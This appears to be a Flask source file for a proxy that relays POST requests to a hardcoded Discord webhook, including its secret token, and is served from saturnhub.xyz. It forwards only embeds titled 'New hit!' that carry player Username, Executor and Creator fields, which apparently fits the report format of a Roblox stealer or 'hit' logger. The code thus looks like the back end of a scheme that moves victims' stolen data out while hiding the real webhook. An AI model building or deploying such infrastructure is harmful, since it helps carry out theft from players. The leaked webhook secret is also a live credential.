from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, time, string, random, os

app = Flask(__name__)
CORS(app)

# 🔒 Your hardcoded Discord webhook
REAL_WEBHOOK = "https://discord.com/api/webhooks/1347215407857270804/xJu0x9KyAtq4B3535P9SdaBvN0FVBzaqPfk59_mLcf6PpSfZWkgq0d9GeQK5vmw_8DKx"

webhook_map = {}
ip_registry = {}
LIMIT_SECONDS = 40  # Cooldown per IP

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/")
def home():
    return "", 204  # Empty homepage

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return "", 204  # Invalid token

    # Get real client IP
    forwarded_for = request.headers.get("X-Forwarded-For")
    if forwarded_for:
        client_ip = forwarded_for.split(",")[0].strip()
    else:
        client_ip = request.remote_addr

    key = f"{token}:{client_ip}"

    # IP Cooldown Check
    if key in ip_registry and time.time() - ip_registry[key] < LIMIT_SECONDS:
        return "", 204

    data = request.json
    if not data or "embeds" not in data:
        return "", 204

    # Validate Embed Content
    allowed = False
    for embed in data["embeds"]:
        title = embed.get("title", "")
        fields = embed.get("fields", [])
        if (
            "New hit!" in title and
            "recive the stuff" in title.lower()
        ):
            for field in fields:
                value = field.get("value", "")
                if (
                    field.get("name") == "Player Info"
                    and "Username:" in value
                    and "Executor:" in value
                    and "Creator:" in value
                ):
                    allowed = True
                    break

    if not allowed:
        return "", 204

    ip_registry[key] = time.time()
    response = requests.post(webhook_map[token], json=data)
    return jsonify({
        "status": "sent",
        "discord_status": response.status_code
    })

# 🔐 Block all other HTTP methods for /webhook/<token>
@app.route("/webhook/<token>", methods=["GET", "DELETE", "PUT", "PATCH", "OPTIONS"])
def block_other_methods(token):
    return "", 405  # Method Not Allowed

if __name__ == "__main__":
    token = "a8dfndf"
    webhook_map[token] = REAL_WEBHOOK

    print("\n✅ Webhook Proxy is Ready!")
    print(f"Send POST requests to: https://saturnhub.xyz/webhook/{token}\n")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
